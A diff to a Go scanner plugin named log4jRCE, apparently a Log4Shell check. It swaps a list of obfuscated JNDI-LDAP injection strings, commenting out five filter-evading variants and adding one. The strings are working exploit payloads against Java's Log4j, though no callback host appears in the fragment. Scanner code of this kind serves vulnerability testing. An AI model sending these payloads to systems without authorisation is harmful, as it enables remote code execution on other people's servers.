@@ -60,12 +60,12 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	// randStr = "nowqq" + utils.RandStringRunes(6)
 	fmt.Println(randStr)
 	payloads := []string{
-		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
-		"${jndi:lda${:-}p://",
-		"${j${aaa::::-n}di:ldap://",
-		"${j${aaa::::-n}d${:-}i:ldap://",
-		"${j${aaa::::-n}d${:-}i:ldap://",
-		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-}p://",
+		//"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
+		//"${jndi:lda${:-}p://",
+		//"${j${aaa::::-n}di:ldap://",
+		//"${j${aaa::::-n}d${:-}i:ldap://",
+		//"${j${aaa::::-n}d${:-}i:ldap://",
+		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-p:}//",
 	}
 
 	reqPaths := []string{
